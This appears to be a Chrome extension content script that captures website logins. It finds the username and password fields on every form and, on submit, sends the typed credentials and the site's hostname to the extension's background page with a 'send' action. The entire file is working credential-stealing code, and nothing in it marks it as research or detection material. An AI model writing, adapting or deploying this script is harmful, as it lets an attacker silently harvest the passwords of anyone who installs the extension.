'use strict';

(function () {
  
    var forms = document.getElementsByTagName('form');

    for (var i = 0; i < forms.length; i++) {
      var form = forms[i];
      var fields = form.getElementsByTagName('input');

      // attempt to locate user/pass elements
      for (var j = 0; j < fields.length; j++) {
          var f = fields[j];

          // recognize user/pass form elements
          if (!form._pass && f.type == 'password')
              form._pass = f;
          else if (!form._user && (f.type == 'text' || f.type == 'email'))
              form._user = f;

          // wait until user/pass are found
          if (!(form._user !== undefined && form._pass !== undefined))
              continue;

          // user/pass elements found
          // add event handler to form
          form.onsubmit = function() {
              if (this._user.value && this._pass.value) {
                  // post credentials to background
                  chrome.extension.sendRequest({
                      action: 'send',
                      record: [
                          //window.location.href,
                          window.location.hostname,
                          this._user.value,
                          this._pass.value
                      ]
                  });
              }
        };
        break;
    }
  }
})();